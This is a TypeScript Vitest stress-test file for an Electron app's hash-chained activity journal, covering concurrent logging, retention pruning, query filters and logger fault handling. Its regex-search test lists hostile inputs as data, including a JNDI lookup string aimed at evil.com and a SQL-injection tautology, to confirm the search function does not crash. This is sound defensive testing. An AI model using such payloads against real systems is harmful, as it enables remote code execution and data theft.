/*
 Copyright 2025 Lee Boonstra

 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
*/

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import * as fs from 'fs'
import * as path from 'path'
import * as os from 'os'

// ── In-Memory Electron Mocks via vi.hoisted ─────────────────────────────────
const {
  ipcHandlers,
  mockIpcMain,
  mockApp,
  mockBrowserWindow,
  mockWebContents,
  mockUserDataDir,
} = vi.hoisted(() => {
  const nodeOs = require('os')
  const nodePath = require('path')
  const handlers = new Map<string, Function>()
  const tmpDir = nodePath.join(
    nodeOs.tmpdir(),
    `nexus-adversarial-test-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`
  )

  const mockWebContents = {
    send: vi.fn(),
  }

  const mockWindow = {
    isDestroyed: vi.fn(() => false),
    webContents: mockWebContents,
  }

  return {
    ipcHandlers: handlers,
    mockUserDataDir: tmpDir,
    mockIpcMain: {
      handle: (channel: string, listener: Function) => {
        handlers.set(channel, listener)
      },
      removeHandler: (channel: string) => {
        handlers.delete(channel)
      },
    },
    mockApp: {
      getPath: vi.fn((name: string) => tmpDir),
      isPackaged: false,
    },
    mockWebContents,
    mockBrowserWindow: {
      getAllWindows: vi.fn(() => [mockWindow]),
    },
  }
})

vi.mock('electron', () => ({
  ipcMain: mockIpcMain,
  app: mockApp,
  BrowserWindow: mockBrowserWindow,
}))

import { registerActivityJournalIPC } from '../src/main/ipc/activityJournal'
import { activityJournalService } from '../src/main/services/activityJournal.service'
import {
  ActivityEntry,
  computeEntryHash,
  GENESIS_PREV_HASH,
  verifyAuditChain,
} from '../src/shared/auditIntegrity'
import { logActivity, LogActivityInput } from '../src/renderer/src/lib/activityLogger'

// IPC helper invoking registered handlers
async function invokeJournalIpc(channel: string, ...args: any[]): Promise<any> {
  const handler = ipcHandlers.get(channel)
  if (!handler) {
    throw new Error(`[IPC Error] No handler registered for channel '${channel}'`)
  }
  return handler({ sender: {} }, ...args)
}

describe('Adversarial Stress Test: Activity Journal IPC, Storage & Pruning (tests/adversarialActivityJournal.stress.test.ts)', () => {
  let testJournalFile: string
  const originalWindow = (globalThis as any).window

  beforeEach(() => {
    ipcHandlers.clear()
    vi.clearAllMocks()

    if (!fs.existsSync(mockUserDataDir)) {
      fs.mkdirSync(mockUserDataDir, { recursive: true })
    }

    testJournalFile = path.join(
      mockUserDataDir,
      `adversarial_journal_${Date.now()}_${Math.random().toString(36).slice(2, 6)}.jsonl`
    )

    activityJournalService.resetForTesting()
    activityJournalService.setStoragePath(testJournalFile)
    registerActivityJournalIPC()
  })

  afterEach(() => {
    activityJournalService.resetForTesting()
    try {
      if (fs.existsSync(testJournalFile)) {
        fs.unlinkSync(testJournalFile)
      }
    } catch {}
    ;(globalThis as any).window = originalWindow
    vi.restoreAllMocks()
  })

  // ═══════════════════════════════════════════════════════════════════════════
  // 1. HIGH-THROUGHPUT BURST STRESS
  // ═══════════════════════════════════════════════════════════════════════════
  describe('1. High-Throughput Burst Stress (1,000 Concurrent Logs)', () => {
    it('handles rapid concurrent logging of 1,000 entries with strict sequence monotonicity and hash continuity', async () => {
      const BURST_COUNT = 1000
      const startTime = performance.now()

      // Fire 1,000 concurrent promises simultaneously via Promise.all
      const recordPromises = Array.from({ length: BURST_COUNT }, (_, index) => {
        return activityJournalService.recordEntry({
          toolId: `tool-${index % 10}`,
          action: `burst_action_${index}`,
          category: (['security', 'network', 'system', 'file', 'crypto', 'api'] as const)[index % 6],
          status: (['success', 'failure', 'warning', 'info'] as const)[index % 4],
          details: `Burst logging entry #${index} payload verification with id ${index}`,
          metadata: { batchIndex: index, timestamp: Date.now() },
          durationMs: index % 50,
        })
      })

      const results = await Promise.all(recordPromises)
      const durationMs = performance.now() - startTime

      // 1. Verify all 1,000 promises succeeded
      expect(results.length).toBe(BURST_COUNT)
      for (let i = 0; i < BURST_COUNT; i++) {
        expect(results[i].success).toBe(true)
        expect(results[i].entry).toBeDefined()
      }

      // 2. Query all entries from service
      const queryRes = await activityJournalService.queryEntries({
        limit: BURST_COUNT + 100,
        offset: 0,
        order: 'asc',
      })

      expect(queryRes.total).toBe(BURST_COUNT)
      expect(queryRes.entries.length).toBe(BURST_COUNT)

      // 3. Monotonicity and hash continuity verification
      const entries = queryRes.entries
      for (let i = 0; i < entries.length; i++) {
        const expectedSequence = i + 1
        expect(entries[i].sequence).toBe(expectedSequence)

        if (i === 0) {
          expect(entries[i].prevHash).toBe(GENESIS_PREV_HASH)
        } else {
          expect(entries[i].prevHash).toBe(entries[i - 1].hash)
        }

        const expectedHash = computeEntryHash(entries[i])
        expect(entries[i].hash).toBe(expectedHash)
      }

      // 4. File-level persistence and line integrity check
      expect(fs.existsSync(testJournalFile)).toBe(true)
      const fileContent = fs.readFileSync(testJournalFile, 'utf8')
      const lines = fileContent.trim().split('\n')

      expect(lines.length).toBe(BURST_COUNT)
      for (let i = 0; i < lines.length; i++) {
        let parsed: any
        expect(() => {
          parsed = JSON.parse(lines[i])
        }).not.toThrow()
        expect(parsed.sequence).toBe(i + 1)
      }

      // 5. Full cryptographic verification oracle
      const integrityResult = await activityJournalService.verifyIntegrity()
      expect(integrityResult.valid).toBe(true)
      expect(integrityResult.totalVerified).toBe(BURST_COUNT)
      expect(integrityResult.brokenIndex).toBeUndefined()

      console.log(`[Burst Stress Benchmark] 1,000 concurrent entries recorded in ${durationMs.toFixed(2)}ms (${(BURST_COUNT / (durationMs / 1000)).toFixed(1)} ops/sec)`)
    })

    it('maintains data consistency during interleaved concurrent reads and writes', async () => {
      const WRITE_COUNT = 300
      const READ_COUNT = 30

      // Fire 300 writes and 30 reads simultaneously in random order
      const tasks: Promise<any>[] = []

      for (let i = 0; i < WRITE_COUNT; i++) {
        tasks.push(
          activityJournalService.recordEntry({
            toolId: 'concurrency-tester',
            action: `write_${i}`,
            category: 'system',
            details: `Concurrent write ${i}`,
          })
        )

        if (i % 10 === 0) {
          tasks.push(
            activityJournalService.queryEntries({
              limit: 20,
              order: 'desc',
            })
          )
        }
      }

      const results = await Promise.all(tasks)
      expect(results.length).toBe(WRITE_COUNT + READ_COUNT)

      // Verify total entries recorded
      const finalQuery = await activityJournalService.queryEntries({ limit: 1000 })
      expect(finalQuery.total).toBe(WRITE_COUNT)

      const integrity = await activityJournalService.verifyIntegrity()
      expect(integrity.valid).toBe(true)
      expect(integrity.totalVerified).toBe(WRITE_COUNT)
    })
  })

  // ═══════════════════════════════════════════════════════════════════════════
  // 2. RETENTION & PRUNING STRESS
  // ═══════════════════════════════════════════════════════════════════════════
  describe('2. Retention & Pruning Stress (> 5,000 Entries)', () => {
    it('verifies that retention pruning cleanly caps entries at 5,000 and verifyAuditChain maintains integrity', async () => {
      // Pre-populate 5,010 entries directly to test file
      const SEED_COUNT = 5010
      const seededEntries: ActivityEntry[] = []
      let lastHash = GENESIS_PREV_HASH

      for (let i = 1; i <= SEED_COUNT; i++) {
        const rawEntry = {
          id: `seed-entry-${i}`,
          sequence: i,
          timestamp: 1700000000000 + i,
          toolId: 'system',
          action: `op_${i}`,
          category: 'system' as const,
          status: 'info' as const,
          details: `Seeded entry ${i}`,
          metadata: { index: i },
          durationMs: 1,
          prevHash: lastHash,
        }
        const hash = computeEntryHash(rawEntry)
        lastHash = hash
        seededEntries.push({ ...rawEntry, hash })
      }

      fs.writeFileSync(
        testJournalFile,
        seededEntries.map((e) => JSON.stringify(e)).join('\n') + '\n',
        'utf8'
      )

      // Initialize service by querying
      const queryRes = await activityJournalService.queryEntries({ limit: 10, order: 'asc' })

      // 1. Check retention cap is strictly enforced at 5,000
      expect(queryRes.total).toBe(5000)
      // Oldest entry should be index 11
      expect(queryRes.entries[0].sequence).toBe(11)

      // 2. Add another 10 entries via recordEntry
      for (let i = 1; i <= 10; i++) {
        const res = await activityJournalService.recordEntry({
          toolId: 'network',
          action: `post_prune_op_${i}`,
          category: 'network',
          details: `Post prune op ${i}`,
        })
        expect(res.success).toBe(true)
        expect(res.entry?.sequence).toBe(5010 + i)
      }

      const totalAfterRecords = await activityJournalService.queryEntries({ limit: 10 })
      expect(totalAfterRecords.total).toBe(5000)

      // 3. Sliding-window pruned chain integrity verification
      const integrity = await activityJournalService.verifyIntegrity()
      const stats = await activityJournalService.getStats()
      const ipcVerify = await invokeJournalIpc('journal:verifyChain')

      expect(integrity.valid).toBe(true)
      expect(integrity.totalVerified).toBe(5000)
      expect(integrity.brokenIndex).toBeUndefined()
      expect(stats.chainValid).toBe(true)
      expect(ipcVerify.valid).toBe(true)
    })

    it('demonstrates service restart persistence after pruning maintains latest 5,000 entries', async () => {
      // 1. Seed 5,010 entries
      const SEED_COUNT = 5010
      const seededEntries: ActivityEntry[] = []
      let lastHash = GENESIS_PREV_HASH

      for (let i = 1; i <= SEED_COUNT; i++) {
        const rawEntry = {
          id: `restart-entry-${i}`,
          sequence: i,
          timestamp: 1700000000000 + i,
          toolId: 'system',
          action: `restart_op_${i}`,
          category: 'system' as const,
          status: 'info' as const,
          details: `Restart op ${i}`,
          metadata: {},
          durationMs: 1,
          prevHash: lastHash,
        }
        const hash = computeEntryHash(rawEntry)
        lastHash = hash
        seededEntries.push({ ...rawEntry, hash })
      }

      fs.writeFileSync(
        testJournalFile,
        seededEntries.map((e) => JSON.stringify(e)).join('\n') + '\n',
        'utf8'
      )

      // 2. Trigger initial load and auto-pruning down to 5,000
      await activityJournalService.ensureInitialized()
      const preRestartTotal = (await activityJournalService.queryEntries()).total
      expect(preRestartTotal).toBe(5000)

      // 3. Simulate process restart by resetting in-memory state
      activityJournalService.resetForTesting()
      activityJournalService.setStoragePath(testJournalFile)

      // 4. Query again (triggers reload from pruned JSONL file on disk)
      const queryRes = await activityJournalService.queryEntries({ limit: 10, order: 'asc' })
      expect(queryRes.total).toBe(5000)
      expect(queryRes.entries[0].sequence).toBe(11)

      // 5. Hash chain continuity between remaining entries (i vs i-1) is still intact:
      const allEntries = (await activityJournalService.queryEntries({ limit: 5000, order: 'asc' })).entries
      for (let i = 1; i < allEntries.length; i++) {
        expect(allEntries[i].prevHash).toBe(allEntries[i - 1].hash)
        expect(allEntries[i].sequence).toBe(allEntries[i - 1].sequence + 1)
        expect(allEntries[i].hash).toBe(computeEntryHash(allEntries[i]))
      }
    })
  })

  // ═══════════════════════════════════════════════════════════════════════════
  // 3. QUERY FILTER STRESS
  // ═══════════════════════════════════════════════════════════════════════════
  describe('3. Query Filter Stress (Multi-parameter, Complex Regex, Boundary, Empty)', () => {
    beforeEach(async () => {
      // Seed 20 diverse entries with timestamps and edge payloads
      const timestamps = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000]
      for (let i = 0; i < 10; i++) {
        await activityJournalService.recordEntry({
          id: `query-seed-${i}`,
          toolId: i % 2 === 0 ? 'api-studio' : 'cyber-fortress',
          action: i % 2 === 0 ? 'dispatch_request' : 'encrypt_vault',
          category: i % 2 === 0 ? 'api' : 'security',
          status: i % 3 === 0 ? 'success' : i % 3 === 1 ? 'failure' : 'warning',
          details: `Entry ${i}: special chars: [test] (sample) {nested} *star* +plus+ ?question? ^caret$ \\backslash |pipe|`,
          metadata: {
            index: i,
            queryParam: `param_${i}`,
            complexString: `{"deep":{"val":"regex.*special?^$+"}}`,
            unicode: '🔥🚀⚡🔒 audit-log Türkçeleştirme',
            nullField: null,
          },
          durationMs: i * 10,
          timestamp: timestamps[i],
        })
      }
    })

    it('handles complex regex metacharacters in search without crashing or throwing RegExp syntax errors', async () => {
      const dangerousPatterns = [
        '.*+?^${}()|[]\\',
        '(?=.*a)(?!.*b)',
        '(a+)+$',
        '[a-z0-9_-]{10,}',
        '\\b(SELECT|INSERT|DELETE|DROP)\\b',
        '\\u0000',
        '\\\\\\\\',
        '${jndi:ldap://evil.com/a}',
        '\' OR \'1\'=\'1',
      ]

      for (const pattern of dangerousPatterns) {
        let res: any
        expect(async () => {
          res = await activityJournalService.queryEntries({ search: pattern })
        }).not.toThrow()
        res = await activityJournalService.queryEntries({ search: pattern })
        expect(res).toBeDefined()
        expect(typeof res.total).toBe('number')
        expect(Array.isArray(res.entries)).toBe(true)
      }
    })

    it('filters accurately by boundary timestamps (exact match, inverted range, negative/NaN, future)', async () => {
      // 1. Exact match (startDate === endDate === 3000)
      const exactRes = await activityJournalService.queryEntries({
        startDate: 3000,
        endDate: 3000,
      })
      expect(exactRes.total).toBe(1)
      expect(exactRes.entries[0].timestamp).toBe(3000)

      // 2. Inverted range (startDate > endDate): should cleanly return 0 results without error
      const invertedRes = await activityJournalService.queryEntries({
        startDate: 7000,
        endDate: 3000,
      })
      expect(invertedRes.total).toBe(0)
      expect(invertedRes.entries).toEqual([])
      expect(invertedRes.hasMore).toBe(false)

      // 3. Out of bounds timestamp range
      const futureRes = await activityJournalService.queryEntries({
        startDate: 999999999999,
        endDate: 9999999999999,
      })
      expect(futureRes.total).toBe(0)

      // 4. NaN or invalid timestamp in query params
      const nanRes = await activityJournalService.queryEntries({
        startDate: NaN as any,
      })
      expect(nanRes).toBeDefined()
    })

    it('handles extreme and adversarial pagination limits and offsets', async () => {
      // 1. Offset way beyond dataset size
      const outOfBoundsOffset = await activityJournalService.queryEntries({
        offset: 99999,
        limit: 10,
      })
      expect(outOfBoundsOffset.total).toBe(10)
      expect(outOfBoundsOffset.entries.length).toBe(0)
      expect(outOfBoundsOffset.hasMore).toBe(false)

      // 2. Negative offset and negative limit (should clamp safely)
      const negativeParams = await activityJournalService.queryEntries({
        offset: -10 as any,
        limit: -5 as any,
      })
      expect(negativeParams.entries.length).toBe(1) // Math.max(1, -5) = 1
      expect(negativeParams.hasMore).toBe(true)

      // 3. Limit of 0 (should clamp to 1)
      const zeroLimit = await activityJournalService.queryEntries({
        limit: 0,
      })
      expect(zeroLimit.entries.length).toBe(1)

      // 4. Invalid order direction
      const invalidOrder = await activityJournalService.queryEntries({
        order: 'invalid_order' as any,
      })
      // Defaults to descending order
      expect(invalidOrder.entries[0].sequence).toBe(10)
      expect(invalidOrder.entries[invalidOrder.entries.length - 1].sequence).toBe(1)
    })

    it('handles empty matches and multi-filter conjunctions safely', async () => {
      // Conjunction that matches nothing
      const impossibleConjunction = await activityJournalService.queryEntries({
        toolId: 'api-studio',
        category: 'security', // api-studio entries have category 'api'
        status: 'warning',
      })
      expect(impossibleConjunction.total).toBe(0)
      expect(impossibleConjunction.entries).toEqual([])
      expect(impossibleConjunction.hasMore).toBe(false)

      // Query against completely empty journal
      await activityJournalService.clearJournal()
      const emptyJournalQuery = await activityJournalService.queryEntries({
        search: 'anything',
      })
      expect(emptyJournalQuery.total).toBe(0)
      expect(emptyJournalQuery.entries).toEqual([])
      expect(emptyJournalQuery.hasMore).toBe(false)
    })
  })

  // ═══════════════════════════════════════════════════════════════════════════
  // 4. LOGGER RESILIENCE STRESS
  // ═══════════════════════════════════════════════════════════════════════════
  describe('4. Logger Resilience Stress (window.nexusAPI Undefined, Corrupted, Throwing)', () => {
    it('returns null when window is undefined', async () => {
      ;(globalThis as any).window = undefined

      const res = await logActivity({
        toolId: 'api-studio',
        action: 'test',
        category: 'api',
        details: 'Testing undefined window',
      })

      expect(res).toBeNull()
    })

    it('returns null when window.nexusAPI is undefined or non-object primitives', async () => {
      const nonObjects = [undefined, null, true, 12345, 'nexusAPI', Symbol('api')]

      for (const val of nonObjects) {
        ;(globalThis as any).window = { nexusAPI: val }

        const res = await logActivity({
          toolId: 'api-studio',
          action: 'test',
          category: 'api',
          details: 'Testing non-object nexusAPI',
        })

        expect(res).toBeNull()
      }
    })

    it('returns null when window.nexusAPI.journal is corrupted or record is not a function', async () => {
      const corruptedJournals = [
        undefined,
        null,
        {},
        { record: 'not_a_function' },
        { record: 42 },
        { record: null },
        { record: {} },
      ]

      for (const journal of corruptedJournals) {
        ;(globalThis as any).window = {
          nexusAPI: { journal },
        }

        const res = await logActivity({
          toolId: 'api-studio',
          action: 'test',
          category: 'api',
          details: 'Testing corrupted journal.record',
        })

        expect(res).toBeNull()
      }
    })

    it('returns null and swallows when journal.record throws a synchronous exception', async () => {
      const consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})

      ;(globalThis as any).window = {
        nexusAPI: {
          journal: {
            record: () => {
              throw new Error('FATAL: Synchronous crash inside IPC record!')
            },
          },
        },
      }

      let res: any
      expect(async () => {
        res = await logActivity({
          toolId: 'api-studio',
          action: 'test',
          category: 'api',
          details: 'Testing synchronous throw in record',
        })
      }).not.toThrow()

      res = await logActivity({
        toolId: 'api-studio',
        action: 'test',
        category: 'api',
        details: 'Testing synchronous throw in record',
      })

      expect(res).toBeNull()
      expect(consoleWarnSpy).toHaveBeenCalled()
    })

    it('returns null and swallows when journal.record returns a rejected promise', async () => {
      const consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})

      ;(globalThis as any).window = {
        nexusAPI: {
          journal: {
            record: vi.fn().mockRejectedValue(new Error('Async IPC Error: electron context lost')),
          },
        },
      }

      const res = await logActivity({
        toolId: 'api-studio',
        action: 'test',
        category: 'api',
        details: 'Testing rejected promise in record',
      })

      expect(res).toBeNull()
      expect(consoleWarnSpy).toHaveBeenCalled()
    })

    it('returns null and does not throw when window.nexusAPI property getter throws', async () => {
      const consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})

      const dangerousWindow: any = {}
      Object.defineProperty(dangerousWindow, 'nexusAPI', {
        get() {
          throw new Error('Security policy violation: window.nexusAPI accessor blocked')
        },
        configurable: true,
      })

      ;(globalThis as any).window = dangerousWindow

      const res = await logActivity({
        toolId: 'api-studio',
        action: 'test',
        category: 'api',
        details: 'Testing throwing property accessor',
      })

      expect(res).toBeNull()
      expect(consoleWarnSpy).toHaveBeenCalled()
    })

    it('handles completely invalid or undefined input to logActivity without crashing', async () => {
      const consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {})

      ;(globalThis as any).window = {
        nexusAPI: {
          journal: {
            record: vi.fn().mockResolvedValue({ id: 'ok' }),
          },
        },
      }

      // Test with null, undefined
      const resNull = await logActivity(null as any)
      expect(resNull).toBeNull()

      const resUndef = await logActivity(undefined as any)
      expect(resUndef).toBeNull()

      // Test with primitive: should execute safely without unhandled exception
      const resPrimitive = await logActivity('invalid_string' as any)
      expect(resPrimitive).toBeDefined()
    })
  })
})
